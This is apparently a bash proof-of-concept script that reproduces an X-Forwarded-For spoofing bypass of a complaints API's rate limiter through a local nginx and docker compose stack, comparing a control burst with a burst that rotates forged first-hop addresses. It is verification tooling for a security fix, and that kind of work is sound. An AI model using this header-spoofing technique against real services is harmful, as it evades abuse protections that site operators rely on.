#!/usr/bin/env bash
# Reproduces the rate-limiter X-Forwarded-For bypass through the REAL frontend proxy (nginx appends the peer address),
# on whatever backend code is checked out. Prints counts and the Redis limiter keys. Needs docker compose, curl.
set -uo pipefail
export COMPOSE_FILE=compose.yaml:scripts/evidence.override.yaml
FRONT=http://localhost:8080
BACK=http://localhost:8000
BODY='{"text":"Streetlight not working near the bus stop for a week","location":"Main Road"}'

wait_ready() { for _ in $(seq 1 60); do curl -fsS "$BACK/ready" >/dev/null 2>&1 && return 0; sleep 2; done; return 1; }
keys() { docker compose exec -T redis redis-cli --scan --pattern 'rl:*' | tr -d '\r' | sort; }
reset() { docker compose exec -T redis redis-cli flushall >/dev/null; }
burst() { # burst <n> <header-template or ''> ; prints "201:x 429:y other:z"
  local n=$1 tmpl=$2 ok=0 lim=0 oth=0 c
  for i in $(seq 1 "$n"); do
    if [ -n "$tmpl" ]; then h=${tmpl//@/$i}; c=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$FRONT/api/complaints" -H 'Content-Type: application/json' -H "X-Forwarded-For: $h" -d "$BODY")
    else c=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$FRONT/api/complaints" -H 'Content-Type: application/json' -d "$BODY"); fi
    case $c in 201) ok=$((ok+1));; 429) lim=$((lim+1));; *) oth=$((oth+1));; esac
  done
  echo "201:$ok 429:$lim other:$oth"
}

echo "commit: $(git rev-parse --short HEAD)  client_id():"; grep -n "split(\",\")" backend/app/deps.py
[ -f .env ] || cp .env.example .env
docker compose up -d --build --quiet-pull >/dev/null 2>&1
wait_ready || { echo "backend never became ready"; docker compose logs backend | tail -30; exit 1; }
echo "limit per minute: $(docker compose exec -T backend printenv RATE_LIMIT_PER_MINUTE | tr -d '\r' || true) (default 20 if empty)"

echo; echo "=== control: 30 POSTs through the frontend, no X-Forwarded-For from the client"
reset; burst 30 ""; echo "limiter keys:"; keys
echo; echo "=== attack: 30 POSTs through the frontend, client rotates a spoofed first hop (10.9.9.@)"
reset; burst 30 "10.9.9.@"; echo "limiter keys:"; keys | head -40
echo "distinct limiter keys: $(keys | wc -l)"
docker compose down >/dev/null 2>&1
